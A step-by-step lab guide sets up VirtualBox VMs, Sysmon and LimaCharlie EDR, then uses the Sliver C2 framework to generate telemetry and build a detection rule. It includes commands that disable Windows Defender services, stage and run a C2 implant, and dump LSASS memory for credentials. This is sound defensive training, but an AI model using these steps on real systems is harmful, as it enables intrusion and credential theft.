# LimaCharlie Lab: Step-by-Step Installation Guide

<div style="text-align: justify">

This guide offers detailed, step-by-step instructions for setting up a virtual environment in VirtualBox. It covers the creation of both an Ubuntu Server VM (attack machine) and a Windows 11 VM (target machine). Additionally, the document provides comprehensive guidance on installing the Sliver C2 Framework on the Ubuntu Server VM, along with configuring Sysmon and LimaCharlie on the Windows 11 VM.

## Outline

1. [VirtualBox Setup](#virtualbox-setup)
2. [Ubuntu Server Installation on VirtualBox](#ubuntu-server-installation-on-virtualbos)
3. [Windows 11 Installation on VirtualBox](#windows-11-installation-on-virtualbos)
4. [Disable Defender on Windows 11](#disable-defender-on-windows-11)
5. [Configure LimaCharlie EDR and Sensor on Windows 11](#configure-limacharlie-edr-and-sensor-on-windows-11)
6. [Install Sliver and Generate Telemetry](#install-sliver-and-generate-telemetry)
7. [Security Test: LSASS Access](#security-test-lsass-access)
8. [Security Test: Volume Shadow Copies Deletion Using vssadmin](#security-test-volume-shadow-copies-deletion-using-vssadmin)


----------------------------------------------------------------------------------------------------


<h1 align="center">Virtual Environment Set Up</h1>

## VirtualBox Setup

VirtualBox is a free and open-source virtualization software that allows users to run multiple operating systems on a single machine. It provides a platform for testing, development, and running applications in isolated environments. To install VirtualBox, follow the instructions on [VirtualBox Webpage](https://www.virtualbox.org/wiki/Downloads) according to your system.

<details>
<summary>
<h3>Lab Virtual Network</h3>
</summary>
<span style="color:gray">

In this lab, We will configure on VirtualBox a virtual network with the following components and respective IP addresses:

- **Virtual Switch** (intnet2) - 172.16.2.0/24
    - **Virtual DHCP Server** - 172.16.2.1
    - **Ubuntu Server VM** (Attack)
        - Adapter 1: NAT - 10.0.2.15
        - Adapter 2: Internal Network (intnet2) - 172.16.2.2
    - **Windows 11 VM** (Target)
        - Adapter 1: NAT - 10.0.2.15
        - Adapter 2: Internal Network (intnet2) - 172.16.2.3
</span>
</details>

<details>
<summary>
<h3>Create an Internal Virtual Network with DHCP Server on VirtualBox</h3>
</summary>
<span style="color:gray">

VirtualBox's internal virtual network allows virtual machines to communicate with each other using an isolated network.

Then, set up a virtual network (intnet2) on VirtualBox with a DHCP server at address `172.16.2.1` and range `172.16.2.2-254` using the command below on the host:

```bash
$ VBoxManage dhcpserver add --network=intnet2 --server-ip=172.16.2.1 --netmask=255.255.255.0 --lower-ip=172.16.2.2 --upper-ip=172.16.2.254 --enable
$ VBoxManage list dhcpservers
```
</span>
</details>

<details>
<summary>
<h3>Create a NAT Network with DHCP server on VirtualBox</h3>
</summary>
<span style="color:gray">

On **VirtualBox Manager**, go to **File > Preferences**:

1. On **Network**, click on **Adds new NAT network**.
2. Click on **Edits selected NAT network**.
	1. (check) **Enable Network**
	2. **Network Name**: NatNetwork
	3. **Network CIDR**: 10.0.2.0/24
	4. **Network Options**: (check) Supports DHCP
	5. Click on **Port Forwarding** and add the entry below:
		|Name	|Protocol	|Host IP	|Host Port	|Guest IP	|Guest Port
		|-------|-----------|-----------|-----------|-----------|--------------|
		|SSH	|TCP		|127.0.0.1	|2200		|10.0.2.4	|22

- **NOTE:** This Port Forwarding entry redirects connections from the Host Machine (**127.0.0.1:2200**) to the VM (**10.0.2.4:22**). To SSH from the Host to the VM, establish a connection to address **127.0.0.1** (localhost) and port **2200** using `ssh -p 2200 user@127.0.0.1`.
</span>
</details>


----------------------------------------------------------------------------------------------------


<h1 align="center">Virtual Machine Installation</h1>

## Ubuntu Server Installation

First, download the [Ubuntu Server 22.04.1](https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso) installer ISO.

<details>
<summary>
<h3>Step 1: Create a New Virtual Machine (VM)</h3>
</summary>
<span style="color:gray">

On **VirtualBox Manager**, click on **New**:

1. **Name and operating system:**
	1. Fill in the fields and click **Next**
2. **Memory Size:**
	1. Set 2 GB or more and click **Next**.
3. **Hard disk:**
	1. Select **Create a virtual hard disk now** and click **Create**.
4. **Hard disk file type:**
	1. Select **VDI (VirtualBox Disk Image)** and click **Next**.
5. **Storage on physical hard disk:**
	1. Select **Dynamically allocated** and click **Next**.
6. **File location and size:**
	1. Choose **file location**.
	2. **Disk size:** 14GB
	3. Click on **Create**.
</span>
</details>

<details>
<summary>
<h3>Step 2: Fine Tune the VM</h3>
</summary>
<span style="color:gray">

On **VirtualBox Manager**, select the **Ubuntu Server VM** created and click on **Settings**:

1. On **System** > **Processor**, set **Processor(s)** to 2 CPUs.
2. On **Storage** > **Storage Device**, click on **Controller: IDE** > **Empty**, then click on the disk on the right side of **Optical Drive** and choose the downloaded **Ubuntu Server image**.
3. On **Network** > **Adapter 1** (enp0s3) set:
	1. **Attached to:** NAT Network
	2. **Name:** NatNetwork
4. Then click on **OK**.
</span>
</details>

<details>
<summary>
<h3>Step 3: Install the Ubuntu Server</h3>
</summary>
<span style="color:gray">

On the **VirtualBox Manager**, select the **Ubuntu Server VM** and click on **Start**:

1. Hit Enter on **Try or Install Ubuntu Server**.
2. Select the **language**.
3. On **Installer update available**:
	1. Select **Continue without updating**.
4. On **Keyboard configuration**:
	1. Select the **Layout** and **Variant** and hit Enter on **Done**.
5. On **Choose type of install**:
	1. Choose **Ubuntu Server** and hit Enter on **Done**.
6. On **Network connections**, let's set a **static IP address** so it doesn’t change throughout the lab experiments.
	2. **Change the interface from DHCPv4 to Manual**:
		1. Click on **enp0s3 > Edit IPv4**
		2. **IPv4 Method:** Manual
		3. Use the Network CIDR of the NAT Network created before:
			- **IPv4 Method:** Manual
			- **Subnet:** 10.0.2.0/24
			- **Address:** 10.0.2.4
			- **Gateway:** 10.0.2.1
			- **Name servers:** 8.8.8.8
			- **Search domains:**
			- **Save**
		4. When you’re done, you should see this:
			- On Network connections:   <br/>
			**NAME** &emsp; **TYPE** &emsp;   **NOTES**   <br/>
			enp0s3 &ensp; eth  &emsp;&emsp;   -         <br/>
			static &emsp; 10.0.2.4/24
		5. **NOTE:** Write down the **Linux VM’s IP address** because you will need it multiple times throughout this guide.
		6. Hit **Done**.
7. On **Configure Proxy**, just hit Enter on **Done**.
8. On **Configure Ubuntu archive mirror**, just hit Enter on **Done**.
9. On **Checking for installer update**:
	1. Wait or hit Continue without updating.
9. On **Guided storage configuration**, just leave the default and hit Enter on **Done**.
10. On **Storage configuration**, just hit Enter on **Done**.
	1. On the message box **Confirm destructive action**, click on **Continue**.
11. On **Profile setup**, fill the fields and hit Enter on **Done**.
12. On **Upgrade to Ubuntu Pro**, select **Skip for now** and hit Enter on **Continue**
13. On **SSH Setup**, select **Install OpenSSH server** and hit Enter on **Done**.
14. On **Featured Server Snaps**, just press Enter on **Done** and the installation will start.
14. When **Install complete!** show on the screen, hit Enter on **Cancel update and reboot**, it will take a while to reboot.
15. On, **Please remove the installation medium**, just hit Enter and it will reboot.
</span>
</details>

<details>
<summary>
<h3>Step 4: Final Adjustments</h3>
</summary>
<span style="color:gray">

After the reboot, let’s configure static IP address on the Ubuntu Server VM.

1. Logon on the **Ubuntu Server**.
2. Let’s find out the **IP address your VM is using as a gateway**, which is given to it by **VirtualBox**:
	```bash
	$ route -n
	```
3. Type the following command to edit the configuration file for the network manager **netplan** and set a static IP address:
	```bash
	$ sudo nano /etc/netplan/00-installer-config.yaml
	'''
	'''yml
    # This is the network config written by 'subiquity'
    network:
    ethernets:
        ens33:
        dhcp4: no
        addresses: [10.0.2.4/24]			# ens33 IP address
        routes:
        - to: default
            via: 10.0.2.1					# Gateway
        nameservers:
            addresses: [8.8.8.8,8.8.4.4]
    version: 2
	'''
	'''bash
	$ sudo netplan try
	$ sudo netplan apply
	$ ping 8.8.8.8
	```

</span>
</details>

<br>

## Windows 11 Installation on VirtualBox

First, download the Windows 11 disk image (ISO) from [here](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise) or [here](https://www.microsoft.com/software-download/windows11), then follow the steps below.

<details>
<summary>
<h3>Step 1: Create a New Virtual Machine (VM)</h3>
</summary>
<span style="color:gray">

On VirtualBox Manager, click on **New**.

1. On **Virtual machine name and operating system**, set:
    - **Name:** Windows 11 (Client 2)
    - **Machine Folder:** /home/username/VirtualBox VMs
    - **ISO Image:** (Leave empty to make a manual installation)
    - **Type:** Microsoft Windows
    - **Version:** Windows 11 (64-bit)
    - Click **Next**.
2. On **Hardware**, set:
    - **Base Memory:** 4096 GB
    - **Processors:** 2
    - Click **Next**.
3. On **Virtual Hard disk**, set:
    - Select **Create a Virtual Hard Disk Now**
    - **Disk Size:** 40 GB
    - Click **Next**.
4. On **Summary**:
    - Review and click **Finish**
</span>
</details>

<details>
<summary>
<h3>Step 2: Fine Tune the VM and Select OS Image</h3>
</summary>
<span style="color:gray">

On VirtualBox Manager, click on **Settings**.

1. On **General** > **Advanced**, set:
    - **Shared Clipboard:** Bidirectional
    - **Drag'n'Drop:** Bidirectional
2. On **Storage**:
    - Click on **Controller: IDE** > **Empty**.
    - Then click in the **blue disk** under **Attributes** on the right side, click on **Choose a disk file...**, and select the **image file**.
3. On **Network** > **Adapter 1** (enp0s3), set:
    - Uncheck **Enable Network Adapter**.
    - **Attached to:** NAT
4. On **Network** > **Adapter 2** (enp0s8), set:
    - Check **Enable Network Adapter**.
    - **Attached to:** Host-only Adapter
    - **Name:** vboxnet1
5. On **Network** > **Adapter 3** (enp0s9), set:
    - Check **Enable Network Adapter**.
    - **Attached to:** Internal Network
    - **Name:** intnet57
6. Then click **OK** to finish.
</span>
</details>

<details>
<summary>
<h3>Step 3: Install the Windows 11</h3>
</summary>
<span style="color:gray">

On VirtualBox Manager, click on **Start** and follow the **Windows installation setup**:

1. Set **language and other preferences** and click **Next**.
2. Click **Install now**.
3. Then click **I don't have a product key**.
4. Select **Windows 11 Pro** and click **Next**.
5. Check **I accept the licence terms** and click **Next**.
6. Select **Customized Install**.
7. Select the **drive** and click **Next** to start the installation.
8. After restart just follow the instructions.
9. On **Let's add your Microsoft account** hit **Shift+F10** to open the command prompt.
    1. Run `OOBE\BYPASSNRO` to disable the Internet connection requirement.
    2. After restart hit **Shit+F10** again and run `ipconfig /release` release the IP addresses from the adapter and disable the Internet.
    3. Close the prompt.
10. Continue the installation.
    1. On **Let's connect to a network**, click **I don't have internet**.
    2. Next click on **Continue with limited setup**.
    3. Set **user name**, **password**, and **security questions**.
    4. Decline the following options to finish the installation.
</span>
</details>

<details>
<summary>
<h3>Step 4: Final Adjustments</h3>
</summary>
<span style="color:gray">

#### VirtualBox Guest Additions

1. Install **VirtualBox Guest Additions**
    - On the host machine, download the corresponding VirtualBox Guest Additions disk image (ISO) from [here](https://download.virtualbox.org/virtualbox).
    - On the **VM's menu bar**, click on **Devices** > **Optical Drives** > **Choose a disk file** and select the **downloaded ISO file**.
    - On **Windows Explorer**, go to the **mounted drive (D:)** and open the **VBoxWindowsAdditions-amd64** file, follow the installation setup and restart the system after finish.
    - After restart, on the VM's menu bar click on **Devices** > **Upgrade Guest Additions...** to allow screen resize and other features.

#### Configure Network

Right-click on the **Network icon** on the right side of the bottom bar (System Tray), then click on **Network and Internet settings**.

1. Click on **Ethernet** and take note of the name of the **network adapters** connect to the network **10.0.2.0/24 (NAT)**, **172.16.57.0/24 (intnet57)**, and **192.168.57.0/24 (vboxnet0)**.
2. On **Network & internet**, click on **Advanced network settings**, click on the **network adapter**, then click on **Rename** and rename them as follows:
    - The **NAT** network adapter rename to **Internet**.
    - The **intnet57** network adapter rename to **INTERNAL**.
    - The **vboxnet0** network adapter rename to **HOST-ONLY**.
3. On **Network & internet**, click on **Ethernet**.
    1. On the **Unidentified network (vboxnet1)** > **IP assignment**, click **Edit**.
    2. On **Edit IP settings** select **Manual**, toggle on **IPv4**, then set:
        - **IP address:** 192.168.57.106
        - **Subnet mask:** 255.255.255.0
        - **Gateway:** (Leave empty)
        - **Preferred DNS:** 127.0.0.1
        - Then click **Save**.

To renew the IP address of the **INTERNAL** network adapter, follow these steps:

1. On the **Domain Controller**, manage the **Address Leases** using the **DHCP** application.
2. On the **Windows 11**, run `ipconfig /release` on the command prompt, then reboot the system (run `ipconfig /renew` will not work).

#### (If needed) Rename Computer

Right-click on the **Start Icon** and click on **System**.

1. On **About** click on **Rename this PC** under **Device specifications**.
2. On **Rename your PC** set the PC name to **WIN11-CLIENT**, then click **Next**.
3. Then click **Restart now**.
</span>
</details>

<details>
<summary>
<h3>Step 5: Install Sysmon</h3>
</summary>
<span style="color:gray">

1. Launch an **Administrative PowerShell console** by typing **powershell** into the search box, then click **Run as administrator** under **Windows PowerShell**.
2. Download **Sysmon** with the following command. Read more about **Sysmon** [here](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon):
    ```
    PS C:\Windows\system32> Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
    ```
3. Unzip **Sysmon.zip**:
    ```
    PS C:\Windows\system32> Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
    ```
4. Download **SwiftOnSecurity’s** (https://infosec.exchange/@SwiftOnSecurity) **Sysmon config**:
    ```
    PS C:\Windows\system32> Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
    ```
5. Install **Sysmon** with **Swift’s config**:
    ```
    PS C:\Windows\system32> C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
    ```
6. Validate **Sysmon64 service** is installed and running:
    ```
    PS C:\Windows\system32> Get-Service sysmon64
    ```
7. Check for the presence of **Sysmon Event Logs**:
    ```
    PS C:\Windows\system32> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
    ```
</span>
</details>

<details>
<summary>
<h3>Step 6: Create a Snapshot</h3>
</summary>
<span style="color:gray">

On the VM top menu, go to **Machine** > **Take a Snapshot...**, enter the snapshot name and description then click **OK**.
</span>
</details>


----------------------------------------------------------------------------------------------------


<h1 align="center">Virtual Machine Configuration</h1>

## Disable Defender on Windows 11

Windows Defender is a built-in antivirus program for Windows operating systems that helps protect against viruses, malware, and other security threats. It provides real-time protection, automatic updates, and scans for potential threats on your computer.

<details>
<summary>
<h3>Step 1: Disable Tamper Protection</h3>
</summary>
<span style="color:gray">

1. Click the **Start** menu icon.
2. Click **Settings**.
3. Click **Privacy & security** on the left menu.
4. Click **Windows Security**.
5. Click **Virus & threat protection**.
6. Under **Virus & threat protection settings**, click **Manage settings**.
7. Toggle **Off** the **Tamper Protection** switch. When prompted, click **Yes**.
8. Toggle **Off** the **other options** as well.
9. Close the window.
</span>
</details>

<details>
<summary>
<h3>Step 2: Permanently Disable Defender via Group Policy Editor</h3>
</summary>
<span style="color:gray">

1. Click the **Start** menu icon.
2. Type **cmd** into the search bar within the **Start Menu**.
3. Click **Run as administrator** under **Command Prompt**
	1. Run the following command: <br/>
		`C:\Windows\System32> gpedit.msc`
4. Inside the **Local Group Policy Editor.**
	1. Click **Computer Configuration** > **Administrative Templates** > **Windows Components** > **Microsoft Defender Antivirus**.
	2. Double-click on **Turn off Microsoft Defender Antivirus**.
	3. Select **Enabled**.
		- If you enable this policy setting, **Microsoft Defender Antivirus** does not run, and will not scan computers for malware or other potentially unwanted software.
	4. Click **Apply**.
	5. Click **OK**.
</span>
</details>

<details>
<summary>
<h3>Step 3: Permanently Disable Defender via Registry</h3>
</summary>
<span style="color:gray">

1. From the same **administrative command prompt** we previously opened, copy/paste this command and press Enter:
	```
	C:\Windows\System32> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
	```
2. While you’re still in the **administrative command prompt**, let’s also **prevent the VM from going into sleep/standby mode** during our tests:
	```
	C:\Windows\System32> powercfg /change standby-timeout-ac 0
	C:\Windows\System32> powercfg /change standby-timeout-dc 0
	C:\Windows\System32> powercfg /change monitor-timeout-ac 0
	C:\Windows\System32> powercfg /change monitor-timeout-dc 0
	C:\Windows\System32> powercfg /change hibernate-timeout-ac 0
	C:\Windows\System32> powercfg /change hibernate-timeout-dc 0
	```
</span>
</details>

<details>
<summary>
<h3>Step 4: Disable All Defender Services</h3>
</summary>
<span style="color:gray">

4. **Prepare to boot into Safe Mode to disable all Defender services**:
    1. Click the **Start** menu icon.
    2. Type **msconfig** into the search bar within the **Start Menu** and open **System Configuration**.
    3. Go to **Boot** tab and on **Boot Options**:
        1. Check the box for **Safe boot** and **Minimal**.
        2. Click **Apply** and **OK**.
    4. System will **restart into Safe Mode**.
5. Now, in **Safe Mode**, we’ll disable some services via the **Registry**:
    1. Click the **Start** menu icon.
    2. Type **regedit** into the search bar and hit Enter.
    3. For each of the following registry locations, you’ll need to browse to the key, find the **Start** value, and change it to **4**:
        1. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense`
        2. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot`
        3. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`
        4. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv`
        5. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc`
        6. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend`
6. Leave **Safe Mode** the same way we got into it:
    1. Click the **Start** menu icon.
    2. Type **msconfig** into the search bar within the **Start Menu** and open **System Configuration**.
    3. Go to **Boot** tab and on **Boot Options**.
        1. Uncheck the box for **Safe boot**.
        2. Click **Apply** and **OK**.
    4. **The system will restart** into the normal desktop environment, now (hopefully) **Defender-free**.
</span>
</details>

<br>

## Configure LimaCharlie EDR and Sensor on Windows 11

LimaCharlie EDR is a cloud-based endpoint detection and response platform that provides real-time threat detection and response capabilities for organizations of all sizes. It offers advanced analytics, automated remediation, and threat hunting to help protect against cyber threats.

<details>
<summary>
<h3>Step 1: Create LimaCharlie Account and Organization</h3>
</summary>
<span style="color:gray">

1. Create a **free LimaCharlie account** (https://app.limacharlie.io/signup).
2. Once **logged into LimaCharlie**, create an **organization**:
    1. **Name:** unique_name
    2. **Data Residency:** closest_residency
    3. **Demo Configuration Enabled:** disabled
    4. **Template:** Extended Detection & Response Standard
</span>
</details>

<details>
<summary>
<h3>Step 2: Install LimaCharlie Sensor on Windows 11</h3>
</summary>
<span style="color:gray">

Once the organization is created, click **Add Sensor**:

1. Select **Windows**.
2. Provide a description such as: **Win11-Target VM**
3. Click **Create**.
4. Select the **Installation Key** we just created.
5. Specify the **x86-64 (.exe)** sensor, but don't follow the instructions provided.
6. In the **Windows VM**, open an **Administrative PowerShell console** and paste the following commands:
```
PS C:\Windows\system32> cd C:\Users\user\Downloads
PS C:\Windows\system32> Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
```
7. Shift into a **standard command prompt** by running this command:
```
PS C:\Windows\system32> cmd.exe
```
8. Next, we will copy the **install command provided by LimaCharlie on step 4 which contains the installation key**. Paste this command into your open terminal:
```
C:\Windows\system32> lc_sensor.exe -i <key>
```
9. Ignore the **ERROR** that says **service installed!**
	1. If you experience an error trying to install the (.exe), try the
	x86-64 (.msi) option on the LimaCharlie installer dialogue.
10. If everything worked correctly, in the **LimaCharlie web UI** you should also see the sensor reporting in, click on **Finish**.
</span>
</details>

<details>
<summary>
<h3>Step 3: Configure LimaCharlie to Ship Sysmon Event Logs</h3>
</summary>
<span style="color:gray">

Now let’s **configure LimaCharlie** to also ship the **Sysmon event logs** alongside its own **EDR telemetry**:

1. In the left-side menu, click **Artifact Collection**.
2. Next to **Artifact Collection Rules**, click **Add Rule**:
	1. **Name:** windows-sysmon-logs
	2. **Platforms:** Windows
	3. **Path Pattern:** wel://Microsoft-Windows-Sysmon/Operational:*
	4. **Retention Period:** 10
	5. Click **Save Rule**.
3. **LimaCharlie** will now start shipping **Sysmon logs** which provide a wealth of **EDR-like telemetry**, some of which is redundant to **LimaCharlie’s own telemetry**, but **Sysmon** is still a very powerful visibility tool that runs well alongside any **EDR agent**.
	1. The other reason we are ingesting **Sysmon logs** is that the built-in **Sigma rules** largely depend on **Sysmon logs**.
</span>
</details>

<br>

## Install Sliver and Generate Telemetry

Sliver C2 Framework is an open-source command and control framework for red teamers and penetration testers. It provides a flexible and extensible platform for managing and controlling compromised systems during security assessments.

<details>
<summary>
<h3>Step 1: Install Sliver C2 Framework on the Ubuntu Server</h3>
</summary>
<span style="color:gray">

1. SSH onto the Ubuntu Server VM from your host system to use a better shell:
```
$ ssh -p 2200 user@127.0.0.1
```
2. Now, from within this new SSH session, proceed with the following instructions to set up our **attacker C2 server**. First, let’s drop into a root shell to make life easier:
```
$ sudo su
```
3. Run the following commands to download **Sliver**, a **Command & Control (C2) framework by BishopFox**:
```
# Download Sliver Linux server binary
$ wget https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
$ chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
$ apt install -y mingw-w64
```
7. Now let’s create a **working directory** we’ll use in future steps
```
# Create and enter our working directory
$ mkdir -p /opt/sliver
```
</span>
</details>

<details>
<summary>
<h3>Step 2: Generate the Command and Control (C2) payload</h3>
</summary>
<span style="color:gray">

1. Drop into a **root shell**:
```
$ sudo su
```
2. Launch **Sliver server**:
```
$ sliver-server
```
3. Generate our first **C2 session payload** (https://github.com/BishopFox/sliver/wiki/Getting-Started#session-mode) within the **Sliver shell** above. Be sure to use your **Linux VM’s IP address** we statically set in **Part 1**:
```
[server] sliver > generate --http <Linux_VM_IP> --save /opt/sliver
```
4. Confirm the new **implant configuration**:
```
[server] sliver > implants
```
5. Now we have a **C2 payload** we can drop onto our **Windows VM**. We’ll do that next. Go ahead and **exit Sliver** for now:
```
[server] sliver > exit
```
6. To easily **download the C2 payload from the Linux VM to the Windows VM**, let’s turn up a temporary **python web server**:
```
$ cd /opt/sliver
$ python3 -m http.server 80
```
7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**. Now run the following command to **download your C2 payload from the Linux VM to the Windows VM**, swapping your own Linux VM IP [Host_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior:
```
PS\> IWR -Uri http://[Host_IP]/[payload_name].exe -Outfile C:\Users\user\Downloads\[payload_name].exe
```
8. Now would be a good time to **Snapshot** your **Windows VM**, before we execute the malware.
    1. Snapshot name: **Malware staged**
</span>
</details>


<details>
<summary>
<h3>Step 3: Start Command and Control (C2) Session</h3>
</summary>
<span style="color:gray">

1. Now that the payload is on the Windows VM, we must switch back to the **Host session** and enable the **Sliver HTTP server** to catch the callback:
    1. First, **terminate the python web server** we started by pressing Ctrl+C.
    2. Now, relaunch **Sliver as root**:
    ```
    $ sliver-server
    ```
    3. Start the **Sliver HTTP listener**:
    ```
    [server] sliver > http
    ```
    4. If you get an **error starting the HTTP listener**, try rebooting the Host and retrying.
2. Return to the **Windows VM** and **execute the C2 payload** from its download location using the same **administrative PowerShell prompt** we had from before:
```
PS\> C:\Users\user\Downloads\[your_C2-implant].exe
```
3. Within a few moments, you should see your **session in the Sliver server**.
4. Type **sessions** on the **Sliver shell** and take note of the **Session ID**:
```
[server] sliver > sessions
```
5. To interact with your new **C2 session** (https://github.com/BishopFox/sliver/wiki/Getting-Started#interacting-with-sessions), type the following command into the **Sliver shell**, swapping [session_id] with yours:
```
[server] sliver > use [session_id]
```
6. You are now interacting directly with the **C2 session** on the **Windows VM**. Let’s run a few **basic commands** to get our bearing on the **victim host**:
    1. Get **basic info** about the **session**:
    ```
    [server] sliver (payload_name) > info
    ```
    2. Find out what **user your implant is running as**, and learn its **privileges**:
    ```
    [server] sliver (payload_name) > whoami
    [server] sliver (payload_name) > getprivs
    ```
    - If your **implant** was properly run with **Admin rights**, you’ll notice we have a few **privileges** that make further attack activity much easier, such as **SeDebugPrivilege** — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.
    3. Identify our **implant’s working directory**:
    ```
    [server] sliver (payload_name) > pwd
    ```
    4. Examine **network connections** occurring on the **remote system**:
    ```
    [server] sliver (payload_name) > netstat
    ```
    - Notice that **Sliver cleverly highlights its own process in green**.
    - **rphcp.exe** is the **LimaCharlie EDR service executable**.
    5. Identify **running processes** on the remote system:
    ```
    [server] sliver (payload_name) > ps -T
    ```
    - Notice that **Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red**.
</span>
</details>

<details>
<summary>
<h3>Step 4: Explore EDR Telemetry Generated</h3>
</summary>
<span style="color:gray">

1. Let’s hop into the **LimaCharlie web UI** (https://app.limacharlie.io) and check out some basic features:
    1. Click **Sensors** on left menu.
    2. Click your **active Windows sensor**.
    3. On the new left-side menu for this sensor, click **Processes**:
        1. Explore what is returned to the **process tree**. Hover over some of the icons to see what they represent.
            1. Get familiar with the most common processes you’ll encounter on even a healthy system. For some helpful resources in **knowing normal**, check out the **Hunt Evil** (https://www.sans.org/posters/hunt-evil) poster from SANS.
        2. A process carrying a valid signature (Signed) is often (almost always) going to be benign itself. However, even legitimate signed processes can be used to launch malicious processes/code (read up on LOLBINs (https://lolbas-project.github.io)).
        3. One of the easiest ways to **spot unusual processes** is to simply look for ones that are **NOT signed**.
        4. In this example, the **C2 implant** shows as not signed, and is also **active on the network**.
        5. Click on **View Network Connections** to identify the **destination IP** this process is communicating with.
    4. Now click the **Network** tab on the left-side menu.
        1. Have a look at what is returned to the **network list**. Try using **Ctrl+F to search** for your **implant name**.
    5. Now click the **File System** tab on the left-side menu:
        1. Browse to `C:\Users\User\Downloads`, the location where the **implant** is **running** from.
        2. Click on **Inspect File Hash** on the implant file, then click on **Search hash on VirusTotal**.
        3. **VirusTotal** will return **Item not found** because we just created the **implant** and its **hash** is not on **VirusTotal database**.
    6. Click **Timeline** on the left-side menu of our sensor. This is a **near real-time view of EDR telemetry + event logs streaming** from this system:
        1. Read about the various **EDR events** in the **LimaCharlie docs** (https://doc.limacharlie.io/docs/documentation/5e1d6b66e38e0-windows-sensor#supported-events).
        2. Practice filtering your timeline with **known IOCs** (indicators of compromise) such as the **implant's name**, **implant's hash**, or the known **C2 IP address**:
            1. If you **scroll back** far enough, should be able to find the **moment your implant was created on the system**, and **when it was launched shortly after**, and the **network connections it created immediately after**.
            2. Examine the other events related to your implant process, you’ll see it is responsible for other events such as **SENSITIVE_PROCESS_ACCESS** from when we enumerated our privileges in an earlier step. This particular event will be useful later on when we craft our first detection rule.
</span>
</details>


----------------------------------------------------------------------------------------------------


<h1 align="center">Security Tests</h1>

## LSASS Access

LSASS Access is a type of cyberattack that targets the Local Security Authority Subsystem Service in Windows operating systems, exploiting vulnerabilities to gain unauthorized access and potentially steal sensitive information.

<details>
<summary>
<h3>Step 1: Let’s Perform the Attack</h3>
</summary>
<span style="color:gray">

1. Get back onto an **SSH session** on the **Linux VM**, and drop into a **C2 session** on your victim.
    1. Retrace your steps from **Step 7** if need be.
2. Run the following commands within the **Sliver session** on your victim host:
    1. First, we need to **check our privileges** to make sure we can perform privileged actions on the host:
    ```
    [server] sliver (payload_name) > getprivs
    ```
    - A powerful privilege to check for is **SeDebugPrivilege** which opens the door for many things. If you’ve got that, we’re good. If you don’t, you need to **relaunch your C2 implant with administrative rights**, as we did in **Step 7**.
    2. Next, let’s do something adversaries love to do for **stealing credentials** on a system — **dump the lsass.exe process from memory**. Read more about this technique here (https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/):
    ```
    [server] sliver (payload_name) > procdump -n lsass.exe -s lsass.dmp
    ```
    - This will **dump the remote process from memory**, and **save it locally on your Sliver C2 server**. We are not going to further process the LSASS dump, but I’ll leave it as an exercise for the reader if you want to try your hand (https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz) at it.
    - **NOTE:** This will fail if you did not launch your C2 payload with admin rights on the Windows system. If it still fails for an unknown reason (RPC error, etc), don’t fret, it likely still generated the telemetry we needed. Move on and see if you can still detect the attempt.
</span>
</details>

<details>
<summary>
<h3>Step 2: Let’s Create the Detection Rule</h3>
</summary>
<span style="color:gray">

1. Now that we’ve done something adversarial, let’s switch over to
   **LimaCharlie** (https://app.limacharlie.io/) to find the relevant telemetry:
    1. Since **lsass.exe** is a known sensitive process often targeted by credential dumping tools, any good **EDR** will generate events for this.
    2. Drill into the **Timeline** of your **Windows VM sensor** and use the **Event Type Filters** to filter for **SENSITIVE_PROCESS_ACCESS** events.
        1. There will likely be many of these, but pick any one of them, as there isn’t much else on this system that will be legitimately accessing LSASS.
    3. Now that we know what the event looks like when **credential access** occurred, we have what we need to craft a **Detection & Response (D&R) Rule** (https://doc.limacharlie.io/docs/documentation/ZG9jOjE5MzExMDE-detection-and-response-rules) that would alert anytime this activity occurs:
        1. Click on the **Build D&R Rule** button in the top right of the event box to begin building a detection rule based on this event.
        2. In the **Detect** section of the new rule, remove all contents and replace them with this:
        ```
        event: SENSITIVE_PROCESS_ACCESS
        op: ends with
        path: event/*/TARGET/FILE_PATH
        value: lsass.exe
        ```
        - We’re specifying that this detection should only look at **SENSITIVE_PROCESS_ACCESS** events where the victim or target process ends with **lsass.exe**
            - For posterity let me state, this rule would be very noisy and need further tuning in a production environment, but for the purpose of this learning exercise, simple is better.
        3. In the **Respond** section of the new rule, remove all contents and replace them with this:
        ```
        - action: report
          name: LSASS access
        ```
